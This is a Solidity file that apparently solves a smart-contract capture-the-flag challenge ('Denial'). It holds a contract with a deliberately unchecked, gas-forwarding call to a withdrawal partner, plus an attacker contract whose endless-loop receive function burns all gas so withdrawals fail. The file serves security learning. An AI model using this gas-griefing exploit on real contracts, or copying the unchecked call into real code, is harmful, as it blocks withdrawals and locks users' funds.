// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import 'hardhat/console.sol';

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");

        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
        console.log("finished");
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}

// Thoughts
// 1. We can't revert in transfer since 'call' won't revert
// 2. By default, 'call' passes the remaining gass
// 3. We will spin waste the gas
contract DenialSolution {
    Denial challenge;
    constructor(address _challengeAddress) public {
        challenge = Denial(payable(_challengeAddress));
        challenge.setWithdrawPartner(address(this));

        require(challenge.partner() == address(this), "Partner incorrect");
    }

    receive() external payable {
        while(true) {}
    }
}
